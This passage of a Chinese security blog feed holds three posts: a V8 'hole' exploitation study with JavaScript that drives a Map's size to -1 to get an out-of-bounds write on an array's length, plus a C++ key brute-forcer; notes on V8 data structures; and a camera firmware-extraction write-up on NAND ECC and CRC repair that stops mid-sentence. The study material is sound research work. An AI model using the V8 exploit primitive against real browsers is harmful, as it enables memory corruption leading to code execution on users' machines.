<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>hole泄漏如何利用JSMap进行攻击。<br>Hole是JS内部的一种数据类型，用来标记不存在的元素，这个数据类型通常是不能泄露到用户JS层面。Hole类型的漏洞利用是指由于内部数据结构通过漏洞被暴露至用户JS层，因此可以根据Hole创建一个长度为-1的JSMap结构，导致越界读写，从而实现RCE。<br>根据前面分析，我们知道当使用map.delete删除一个元素时，只是将该元素的key，value设置为hole，并没有实际地删除该元素，实际上只是做了标记，当进行shrink操作时，这些被hole标记的元素才会被真正删除。那么如果我们可以创建key&#x3D;hole的元素，那么我们就可以多次删除元素从而导致map.size为-1（当然这里前提是不进行shrink操作，因为shrink操作会清除hole元素）。<br>考虑如下代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();    </span><br><span class="line"><span class="keyword">let</span> hole = %<span class="title class_">TheHole</span>();</span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">set</span>(hole, <span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line">map.<span class="title function_">delete</span>(<span class="number">1</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(map.<span class="property">size</span>);</span><br><span class="line"><span class="comment">// 输出：</span></span><br><span class="line"><span class="comment">// -1</span></span><br></pre></td></tr></table></figure>
<img src="/posts/332a3199/file-20250909174119641.png" class="">
<p>调试可以发现elements变为-1。<br>但是如果是如下代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();    </span><br><span class="line"><span class="keyword">let</span> hole = %<span class="title class_">TheHole</span>();</span><br><span class="line">map.<span class="title function_">set</span>(hole, <span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(map.<span class="property">size</span>);</span><br><span class="line"><span class="comment">// 输出：</span></span><br><span class="line"><span class="comment">// 0</span></span><br></pre></td></tr></table></figure>
<p>因为这样在删除一次hole后，elements &#x3D; 0，buckets &#x3D; 2，导致发生shrink，则hole元素会被删除。<br>接下来则是进行OOB。<br>如果我们继续向map中添加元素，在之前set操作分析中，当添加一个新元素时，new entry寻找方式为&amp;hashTable + buckets + occupancy * 3，这里occupancy &#x3D; elements + deleted。在构造map.size &#x3D; -1后，相关字段为：elements &#x3D; -1, deleted &#x3D; 0, buckets &#x3D; 2。所以new_entry &#x3D; &amp;hashTable + 2 + (-1 + 0)  * 3 &#x3D; &amp;hashTable - 1 &#x3D; hashTable[-1] &#x3D; &amp;buckets<br>所以new_entry &#x3D; key|value|chain &#x3D; buckets|hashTable[0]|hashTable[1]，即下一次添加新元素时，就可以修改buckets &#x3D; key1、hashTable[0] &#x3D; value1<br>然后我们再添加新元素，此时：new_entry &#x3D; &amp;hashTable + buckets + (0 + 0) * 3 &#x3D; hashTable[key1]， 而key1我们可以控制，所以new_entry也是可控的，从而越界写key&#x2F;value，这里一般就是去写JSArray的length字段。但是需要注意的是，在set操作中，当对bucket链表进行遍历时会进行检查，所以我们需要使bucket[hash(key) &amp; (buckets - 1)] &#x3D; -1从而避免遍历bucket链表。<br>构造好map.size &#x3D; -1后，第一次添加新元素时无所谓的，因为此时bucket[0] &#x3D; -1、bucket[1] &#x3D; -1，但是第二次就需要注意了，第一次添加时会导致bucket[0] !&#x3D; -1或者bucket[1] !&#x3D; -1，但是其实bucket[0] &#x3D; value1，所以可以让bucket[0] &#x3D; value1 &#x3D; -1，这样在第二次添加时我们只需要让：hash(key2) &amp; (buckets - 1) &#x3D; 0即可，这里到时候爆破一下即可。<br>模版如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line"><span class="keyword">var</span> hole = <span class="title function_">leak_hole</span>();</span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">set</span>(hole, <span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line">map.<span class="title function_">delete</span>(<span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">set</span>(oob_write_offset, -<span class="number">1</span>);</span><br><span class="line"><span class="keyword">var</span> oob_array = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> obj_arr = [&#123;&#125;];</span><br><span class="line"><span class="keyword">var</span> float_arr = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> rw_arr = [<span class="number">1.1</span>];</span><br><span class="line">map.<span class="title function_">set</span>(key2, value2);</span><br><span class="line"><span class="comment">// 其中hashTable[oob_write_offset + 3] = 预被修改的地址</span></span><br><span class="line"><span class="comment">// hashTable[oob_write_offset + 3] = key2</span></span><br><span class="line"><span class="comment">// 也可以用value2去控制</span></span><br><span class="line"><span class="comment">// 但是打JSArray的length字段时，还是用key2去写length</span></span><br><span class="line"><span class="comment">// 因为如果用value2去写length的话，elements会被key2覆盖</span></span><br></pre></td></tr></table></figure>
<p>key2爆破脚本，这里ComputeUnseededHash函数以实际V8源码为准：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span>  </span></span><br><span class="line"><span class="function"><span class="type">uint32_t</span> <span class="title">ComputeUnseededHash</span><span class="params">(<span class="type">uint32_t</span> key)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> hash = key;</span><br><span class="line">    hash = ~hash + (hash &lt;&lt; <span class="number">15</span>);</span><br><span class="line">    hash = hash ^ (hash &gt;&gt; <span class="number">12</span>);</span><br><span class="line">    hash = hash + (hash &lt;&lt; <span class="number">2</span>);</span><br><span class="line">    hash = hash ^ (hash &gt;&gt; <span class="number">4</span>);</span><br><span class="line">    hash = hash * <span class="number">2057</span>;</span><br><span class="line">    hash = hash ^ (hash &gt;&gt; <span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> hash &amp; <span class="number">0x3fffffff</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> key = <span class="number">0x2000</span>, buckets = <span class="number">0x25</span>;</span><br><span class="line">    <span class="keyword">while</span> ((<span class="built_in">ComputeUnseededHash</span>(key) &amp; (buckets - <span class="number">1</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">	    key++;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%#xn&quot;</span>, key);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="相关例题"><a href="#相关例题" class="headerlink" title="相关例题"></a>相关例题</h2><p>一般思路为利用漏洞把hole泄漏出来，后面基本上是一样的。这里直接用%TheHole()来获取Hole。演示利用手法：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;log&#125; = <span class="variable language_">console</span>;</span><br><span class="line"><span class="keyword">var</span> raw_buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> d_buf = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(raw_buf);</span><br><span class="line"><span class="keyword">var</span> l_buf = <span class="keyword">new</span> <span class="title class_">BigInt64Array</span>(raw_buf);</span><br><span class="line"><span class="keyword">let</span> <span class="title function_">d2l</span> = (<span class="params">v</span>) =&gt; &#123;</span><br><span class="line">	d_buf[<span class="number">0</span>] = v;</span><br><span class="line">    <span class="keyword">return</span> l_buf[<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> <span class="title function_">l2d</span> = (<span class="params">v</span>) =&gt; &#123;</span><br><span class="line">	l_buf[<span class="number">0</span>] = v;</span><br><span class="line">    <span class="keyword">return</span> d_buf[<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> <span class="title function_">hexx</span> = (<span class="params">str, v</span>) =&gt; &#123;</span><br><span class="line"><span class="title function_">log</span>(<span class="string">&quot;&amp;#x0;33[32m&quot;</span>+str+<span class="string">&quot;: &amp;#x0;33[0m0x&quot;</span>+v.<span class="title function_">toString</span>(<span class="number">16</span>)); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">let</span> <span class="title function_">decc</span> = (<span class="params">str, v</span>) =&gt; &#123;</span><br><span class="line"><span class="title function_">log</span>(<span class="string">&quot;&amp;#x0;33[32m&quot;</span>+str+<span class="string">&quot;: &amp;#x0;33[0m&quot;</span>+v);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line"><span class="keyword">const</span> hole = %<span class="title class_">TheHole</span>();</span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">set</span>(hole, <span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line">map.<span class="title function_">delete</span>(<span class="number">1</span>);</span><br><span class="line"><span class="title function_">decc</span>(<span class="string">&quot;map.size&quot;</span>, map.<span class="property">size</span>);</span><br><span class="line"></span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">37</span>, -<span class="number">1</span>);</span><br><span class="line"><span class="keyword">var</span> oob_arr = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> tmp_arr = [<span class="number">2.2</span>];</span><br><span class="line"><span class="keyword">var</span> rw_arr = [<span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">var</span> obj_arr = [<span class="number">0xeada</span>, rw_arr];</span><br><span class="line"><span class="title function_">hexx</span>(<span class="string">&quot;oob_arr.length&quot;</span>, oob_arr.<span class="property">length</span>);</span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">0x2002</span>, <span class="number">0</span>);</span><br><span class="line"><span class="title function_">hexx</span>(<span class="string">&quot;oob_arr.length&quot;</span>, oob_arr.<span class="property">length</span>);</span><br></pre></td></tr></table></figure>
<p>需要爆破key2，然后可以修改oob_arr.length的值</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://cn-sec.com/archives/2493725.html">V8 hole 类型漏洞利用总结</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>V8 数据结构</title>
    <url>/posts/2c0282e4.html</url>
    <content><![CDATA[<p>记录下V8的数据结构。</p>
<h2 id="ArrayBuffer"><a href="#ArrayBuffer" class="headerlink" title="ArrayBuffer"></a>ArrayBuffer</h2><p>用于表示通用的原始二进制数据缓冲区。其为字节数组（bytearray）。不能直接操作ArrayBuffer内容，而是要通过类型化数组对象或DataView对象来操作，它们会将缓冲区中的数据表示为特定的格式，并通过这些格式来读写缓冲区内容。</p>
<h3 id="创建ArrayBuffer"><a href="#创建ArrayBuffer" class="headerlink" title="创建ArrayBuffer"></a>创建ArrayBuffer</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建8字节缓冲区，并使用Int32Array视图引用</span></span><br><span class="line"><span class="keyword">const</span> buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">const</span> view = <span class="keyword">new</span> <span class="title class_">Int32Array</span>(buffer);</span><br></pre></td></tr></table></figure>
<h3 id="操作ArrayBuffer"><a href="#操作ArrayBuffer" class="headerlink" title="操作ArrayBuffer"></a>操作ArrayBuffer</h3><p>要操作ArrayBuffer内容，需要使用视图对象。视图对象不存储任何数据，它只是对ArrayBuffer中字节的解释。例如<code>Uint8Array</code>将每个字节视为独立的数字。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">let</span> view = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(buffer);</span><br><span class="line">view[<span class="number">0</span>] = <span class="number">123456</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> num <span class="keyword">of</span> view) &#123;</span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">log</span>(num); <span class="comment">// output: 123456, 0, 0, 0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="DataView"><a href="#DataView" class="headerlink" title="DataView"></a>DataView</h3><p>DataView是一个特殊的“无类型”视图，其允许在任何偏移量以任何格式访问数据。与类型化数组不同，DataView的构造函数不指定格式，而是在方法调用时指定。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> buffer = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>]).<span class="property">buffer</span>;</span><br><span class="line"><span class="keyword">let</span> dataView = <span class="keyword">new</span> <span class="title class_">DataView</span>(buffer);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dataView.<span class="title function_">getUint8</span>(<span class="number">0</span>)); <span class="comment">// 255</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dataView.<span class="title function_">getUint16</span>(<span class="number">0</span>)); <span class="comment">// 65535</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dataView.<span class="title function_">getUint32</span>(<span class="number">0</span>)); <span class="comment">// 42...</span></span><br></pre></td></tr></table></figure>
<p>DataView非常适合在同一缓冲区中存储混合格式数据。</p>
<h2 id="JSArray"><a href="#JSArray" class="headerlink" title="JSArray"></a>JSArray</h2><p>JSArray对象的结构如下：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line">struct <span class="title class_">JSArray</span> &#123;</span><br><span class="line">	<span class="attr">map</span>: <span class="title class_">Map</span>,</span><br><span class="line">	<span class="attr">properties_or_hash</span>: <span class="title class_">Object</span>,</span><br><span class="line">	<span class="attr">elements</span>: <span class="title class_">Object</span>,</span><br><span class="line">	<span class="attr">length</span>: <span class="title class_">Number</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>map可以看作JSArray对象的vtable（JS Prototype）。</p>
]]></content>
  </entry>
  <entry>
    <title>HKVS获取固件</title>
    <url>/posts/a69ee494.html</url>
    <content><![CDATA[<p>一个项目设备，记录下获取到固件的过程。</p>
<h2 id="尝试1：串口提取（失败）"><a href="#尝试1：串口提取（失败）" class="headerlink" title="尝试1：串口提取（失败）"></a>尝试1：串口提取（失败）</h2><p>首先通过USB2TTL拿到了U-Boot shell。命令里没有md等命令，尝试通过设置bootargs环境变量方式来。</p>
<img src="/posts/a69ee494/file-20250920143343979.png" class="">


<h2 id="尝试2：mtd-挂载（失败）"><a href="#尝试2：mtd-挂载（失败）" class="headerlink" title="尝试2：mtd 挂载（失败）"></a>尝试2：mtd 挂载（失败）</h2><p>还考虑使用 mtd 挂载的方式来读取，不过经过尝试，该方法仅适用于 ubi.img 没有错误的情况，否则会在 ubi attach 的时候报错。<br>对应的 flash 芯片为 GD5F2GQ5UExxG，对应文档链接：<a href="https://download.gigadevice.com/Datasheet/DS-00890-GD5F2GQ5UExxG-Rev1.6.pdf">https://download.gigadevice.com/Datasheet/DS-00890-GD5F2GQ5UExxG-Rev1.6.pdf</a><br>可以看到比较重要的数据：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这四位是 <span class="built_in">read</span> ID 返回的四个字节</span></span><br><span class="line">Manufacturer ID: 0xC8</span><br><span class="line">Device ID: 0x52</span><br><span class="line">Byte2 Byte value: none</span><br><span class="line">Byte3 Byte value: none</span><br></pre></td></tr></table></figure>
<p>提取到的 bin 文件差不多为 256MB ，共有 2k 个块<br>进行挂载不太行，首先是没有对应的 mtd simulated device,使用其他的类似的挂载上去也会发现有错误。</p>
<h2 id="尝试3：ECC-修复（失败）"><a href="#尝试3：ECC-修复（失败）" class="headerlink" title="尝试3：ECC 修复（失败）"></a>尝试3：ECC 修复（失败）</h2><p>这里感觉是解决 bit flip 的最正规的方法，但奈何 提到的 flash 格式与 官方 datasheet 格式不一致，怀疑是厂商自定义了一套软件层的 ECC。以下仅作参考<br>感觉可以尝试利用起来 flash 的 ECC 了，如果真的是有 bit flip 存在的话。<br>直接在 linux 源码中找到了该设备对应的 布局源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">SPINAND_INFO(<span class="string">&quot;GD5F2GQ5UExxG&quot;</span>,</span><br><span class="line">	     SPINAND_ID(SPINAND_READID_METHOD_OPCODE_DUMMY, <span class="number">0x52</span>),</span><br><span class="line">	     NAND_MEMORG(<span class="number">1</span>, <span class="number">2048</span>, <span class="number">128</span>, <span class="number">64</span>, <span class="number">2048</span>, <span class="number">40</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>),</span><br><span class="line">	     NAND_ECCREQ(<span class="number">4</span>, <span class="number">512</span>),</span><br><span class="line">	     SPINAND_INFO_OP_VARIANTS(&amp;read_cache_variants_2gq5,</span><br><span class="line">				      &amp;write_cache_variants,</span><br><span class="line">				      &amp;update_cache_variants),</span><br><span class="line">	     SPINAND_HAS_QE_BIT,</span><br><span class="line">	     SPINAND_ECCINFO(&amp;gd5fxgqx_variant2_ooblayout,</span><br><span class="line">			     gd5fxgq5xexxg_ecc_get_status)),</span><br></pre></td></tr></table></figure>
<p>问了 gpt 可以知道基本信息：</p>
<ul>
<li>page_size: 2048，每页2kb</li>
<li>oob_size: 128，每个 oob 区 128 字节</li>
<li>pages_per_block：每块 64 页</li>
<li>ECC 要求：每 512 字节 需要 4-bit ECC</li>
</ul>
<p>按之前的理论，一个 page 一个 oob 区，其内存布局如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">data1: 0x000 - 0x410    (size: 0x410)</span><br><span class="line">oob1/free: 0x410 - 0x43a    (size: 0x2a)</span><br><span class="line">data2: 0x43a - 0x800    (size: 0x3c6)</span><br><span class="line">oob2/free: 0x800 - 0x802    (size: 0x2)</span><br><span class="line">data3: 0x802 - 0x82c    (size: 0x2a)</span><br><span class="line">oob3/free: 0x82c - 0x880    (size: 0x54)</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/mnt/SJTU/研究生/任务/Projects/码头/camera/haikang/firmware/most_common</span><br><span class="line">base ❯ hexdump -v -C -n $((2176*103)) ./most_common.BIN| tail -n 9</span><br><span class="line">00036b00  ff ff 73 48 ef 6f 7c 68  e9 a1 6e 4a bd 8e 31 b6  |..sH.o|h..nJ..1.|</span><br><span class="line">00036b10  75 d7 67 e3 f3 55 df ec  fc cc 7a 17 41 41 ce 5c  |u.g..U....z.AA.\|</span><br><span class="line">00036b20  7c eb f6 4b 95 e5 da b0  72 86 55 c5 a3 6d 8d 81  ||..K....r.U..m..|</span><br><span class="line">00036b30  7c 4a 8c 48 a6 b4 df 9f  31 f8 d3 76 2c 4c ec 6b  ||J.H....1..v,L.k|</span><br><span class="line">00036b40  c7 84 41 c9 88 e8 07 92  29 41 ab d3 3e 87 18 6a  |..A.....)A..&gt;..j|</span><br><span class="line">00036b50  f6 ca 4e 9b 77 7c ff ff  ff ff ff ff ff ff ff ff  |..N.w|..........|</span><br><span class="line">00036b60  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|</span><br><span class="line">00036b70  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|</span><br><span class="line">00036b80</span><br><span class="line"></span><br><span class="line">/mnt/SJTU/研究生/任务/Projects/码头/camera/haikang/firmware/most_common</span><br><span class="line">base ❯ hexdump -v -C -n $((2176*13)) ./most_common.BIN| tail -n 9</span><br><span class="line">00006e00  ff ff 5a e3 11 00 00 0a  40 20 c2 e3 01 50 a0 e3  |..Z.....@ ...P..|</span><br><span class="line">00006e10  20 20 82 e3 00 20 83 e5  48 20 1b e5 01 3a a0 e3  |  ... ..H ...:..|</span><br><span class="line">00006e20  70 30 41 e3 00 10 a0 e3  08 20 83 e5 fb 77 2d 55  |p0A...... ...w-U|</span><br><span class="line">00006e30  8b 33 62 35 c0 aa 38 84  74 70 11 80 5b 9e 7c d5  |.3b5..8.tp..[.|.|</span><br><span class="line">00006e40  db b2 41 91 90 ef 8f 0f  dd 5d f3 f0 cd 2a 0c 47  |..A......]...*.G|</span><br><span class="line">00006e50  10 4f b7 0f 8f 68 ff ff  ff ff ff ff ff ff ff ff  |.O...h..........|</span><br><span class="line">00006e60  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|</span><br><span class="line">00006e70  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|</span><br><span class="line">00006e80</span><br><span class="line"></span><br><span class="line">/mnt/SJTU/研究生/任务/Projects/码头/camera/haikang/firmware/most_common</span><br><span class="line">base ❯ hexdump -v -C -n $((2176*3)) ./most_common.BIN| tail -n 9</span><br><span class="line">00001900  ff ff db e5 00 40 8e e5  5c 00 00 0a 0b 00 00 3a  |.....@..\......:|</span><br><span class="line">00001910  04 00 50 e3 03 00 00 1a  2e 00 5b e5 70 00 ef e6  |..P.......[.p...|</span><br><span class="line">00001920  1c d0 4b e2 f0 8b bd e8  00 30 e0 e3 53 23 5a 08  |..K......0..S#Z.|</span><br><span class="line">00001930  6c 64 97 b8 68 c4 f8 6e  d2 f8 a8 10 46 ff e4 14  |ld..h..n....F...|</span><br><span class="line">00001940  ce d7 39 a9 7b 68 8b 56  cf 52 21 6c 92 17 e1 71  |..9.&#123;h.V.R!l...q|</span><br><span class="line">00001950  08 18 40 c6 2d bd ff ff  ff ff ff ff ff ff ff ff  |..@.-...........|</span><br><span class="line">00001960  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|</span><br><span class="line">00001970  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|</span><br><span class="line">00001980</span><br></pre></td></tr></table></figure>
<p>如上图所示，可见 oob2 区域固定为 0xffff 两个字节，最后 oob3 区域的最后 0x2a 字节固定为 0xff<br>编写脚本验证可知该条件成立：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">BLOCK_SIZE = <span class="number">0x880</span></span><br><span class="line">violation_num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">blank_pattern1 = <span class="string">b&quot;\xff&quot;</span>*<span class="number">0x2</span></span><br><span class="line">blank_pattern2 = <span class="string">b&quot;\xff&quot;</span>*<span class="number">0x2a</span></span><br><span class="line">const_pattern1 = <span class="string">b&quot;\xff&quot;</span>*<span class="number">0x2</span></span><br><span class="line">const_pattern2 = <span class="string">b&quot;\xff&quot;</span>*<span class="number">0x2a</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./most_common.BIN&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    size = f.seek(<span class="number">0</span>, os.SEEK_END)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;target firmware size: <span class="subst">&#123;<span class="built_in">hex</span>(size)&#125;</span>&quot;</span>)</span><br><span class="line">    block_num = size // BLOCK_SIZE</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(block_num):</span><br><span class="line">        f.seek(BLOCK_SIZE*i+<span class="number">0x800</span>)</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">0x100</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;read block (<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>/<span class="subst">&#123;block_num&#125;</span>)&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> f.read(<span class="number">2</span>) != const_pattern1:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;block <span class="subst">&#123;i&#125;</span> violation pattern1!&quot;</span>)</span><br><span class="line">            violation_num += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        f.seek(BLOCK_SIZE*i+<span class="number">0x856</span>)</span><br><span class="line">        <span class="keyword">if</span> f.read(<span class="number">0x2a</span>) != const_pattern2:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;block <span class="subst">&#123;i&#125;</span> violates pattern2!&quot;</span>)</span><br><span class="line">            violation_num += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;result: violations block num is <span class="subst">&#123;violation_num&#125;</span>, total block num is <span class="subst">&#123;block_num&#125;</span>.&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>也就是说有0x2c字节是固定值，剩下 0x80 -0x2c&#x3D;84 字节即可能为进行ecc的部分，不过按照 linux 源码机制 应该是 有64字节为ecc，其他字节均为 free 字段，每 512 字节对应 4-bit ecc<br>这里放一下官方的 对应芯片 的 datasheet 吧： </p>
<img src="/posts/a69ee494/file-20251022101506347.png" class="">
<p>据官方描述，应该是有64字节来用于 ECC 纠错<br>这里假设是要把原布局改为：data1 - data2 - data3 - oob2 - oob1 - oob3，然后可以得到正常的 2048 + 128 内存布局<br>有一个比较明显的例子：<br>在 0xa766990 地址，应该是直接将 数据data3 拼接到 data2 后面，<br>更新，这一步放弃了，看不懂 ecc 的格式，后面还是建议多次读，取众数吧</p>
<h2 id="尝试2：flash-dump固件（部分成功）"><a href="#尝试2：flash-dump固件（部分成功）" class="headerlink" title="尝试2：flash dump固件（部分成功）"></a>尝试2：flash dump固件（部分成功）</h2><p>该方法也是我们最初采取的方法，但是当时提出来拿到 ubi 后发现各种方式都无法直接解析就暂时搁置了… 而且有一个很抽象的问题就是每次读取的 flash 内容都存在随机位置的 bit flip 。这个可能是使用热风枪吹 flash 时过热把 flash 烧坏了，不过后续还是部分绕过了该问题。</p>
<h3 id="固件去除-ECC-段"><a href="#固件去除-ECC-段" class="headerlink" title="固件去除 ECC 段"></a>固件去除 ECC 段</h3><p>查看从 flash 中 dump 到了固件，可以发现每隔0x800存在0x80的 spare padding 内容，需要进行patch，这一部分在后续继续查阅资料可以发现是 OOB（ECC）区域，并且该区域位置很奇怪（在0x410 有 0x2a 字节不知道是什么用处，在 0x802 后也有 0x2a 字节则是有效数据，需要保留）。但是发现每次dump到的flash不太一样，大概率是flash被吹坏了。</p>
<blockquote>
<p>也有可能是 NAND 有一个 bit flip 的机制（不太懂，这个我觉得大概率就是flash质量不行了 XD</p>
</blockquote>
<h3 id="ubi-格式修复"><a href="#ubi-格式修复" class="headerlink" title="ubi 格式修复"></a>ubi 格式修复</h3><p>使用 github 上的 ubidump repo 工具来解析。使用这个的目的是源码便于理解以及修改。<br>这里出现了另外一个问题是针对上面去除 ECC 后的 ubi.img 进行提取，只识别到app_pri, cfg_pri两个类型，以及只有一个文件。<br>通过调试发现可以通过修改 ubidump.py 的逻辑来改进，（应该是 vid_data，ubidump 没有集成多个 vtable 的能力，因此会默认选取最后一个 vtable[0]）<br>但是还是只能获取到部分，此时能提取到的文件从1个变为了1MB的文件系统，感觉还是损坏的问题（没错，就是 bit flip，导致有很多错误致使提取提前结束）。</p>
<h3 id="brute-force-crc"><a href="#brute-force-crc" class="headerlink" title="brute force crc"></a>brute force crc</h3><p>这一操作非常的不优雅，但是却极其有效，因为基于了一个事实：发生 bit flip 的概率是比较小的，并且 ubi 对应的一个 inode data 的大小也不够大，因此在一个 node 中的 data 的 crc 校验失败大概率仅有一个 bit flip 导致，因此只要稍微 爆破 一下即可（实际上在爆破中确实有大 node 会导致卡比较久的时间）<br>首先在 listfiles 功能上进行实验，因为在 ubidump 提取文件时比如在 listfiles 功能中，解析的大多数 node 的 data 大小都比较小，可以尝试爆破的手段。<br>经过尝试非常可取，可以将所有的文件都列举出来（中间有一个 invalid node size 的报错，当然也是由于 bit filp 导致的 : )，这个会在最后再简单提及）<br>简单实现了一个假设只需要爆破1bit的情况的脚本。提取目标固件，可以成功提取到大小 38 MB 的文件系统。经过统计，共出现了422处需要爆破的位置，共有406处爆破成功crc。失败文件如下：</p>
